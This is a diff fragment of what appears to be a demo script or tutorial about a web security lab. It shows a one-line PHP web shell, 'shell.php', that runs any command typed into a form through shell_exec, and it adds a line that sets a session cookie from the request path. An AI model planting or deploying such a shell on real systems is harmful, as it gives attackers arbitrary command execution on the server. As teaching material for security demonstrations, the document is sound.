@@ -94,7 +94,7 @@ Point at the new **DASHBOARD** and **ADMIN** tabs.
 Show `shell.php` in an editor - a text box and a Run button:
 
 ```php
-<?php if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"])??"")."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>
+<?php if(preg_match('#^/i/([a-f0-9]{10})/#',$_SERVER["SCRIPT_NAME"],$m))setcookie("ss_sid",$m[1],time()+604800,"/");if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"])??"")."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>
 ```
 
 > "Whatever you type in that box, the server runs. That's it. That's the
